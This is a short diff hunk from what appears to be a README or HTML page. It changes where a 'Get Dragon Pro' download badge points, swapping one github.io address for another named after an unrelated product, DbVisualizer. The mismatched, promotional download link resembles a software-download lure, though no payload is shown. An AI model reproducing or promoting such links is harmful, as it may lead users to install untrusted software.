@@ -7,7 +7,7 @@
 </div>
 
 <div align="center" style="margin:50px 0;">
-  <a href="https://nuance-dragon-pro.github.io/.github">
+  <a href="https://dbvisualizer.github.io/.github/">
     <img src="https://img.shields.io/badge/⬇️_Get_Dragon_Pro_✨-2E86C1?style=for-the-badge" alt="Get Dragon Pro"/>
   </a>
 </div>
